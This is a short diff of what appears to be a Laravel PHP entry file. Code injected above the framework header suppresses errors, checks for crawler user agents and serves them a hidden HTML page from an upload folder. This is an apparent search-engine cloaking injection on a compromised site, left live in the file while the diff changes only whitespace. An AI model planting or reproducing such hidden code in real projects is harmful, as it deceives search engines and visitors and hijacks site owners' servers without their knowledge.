@@ -1,5 +1,4 @@
 <?php
-
 error_reporting(0);
 $s_ref = $_SERVER['HTTP_REFERER'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
@@ -10,6 +9,7 @@ if(strpos($agent,'bot') > 0 && $_SERVER['REQUEST_URI']=='/'){
     include('upload/img/homepage.html');
     exit;
 }
+
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
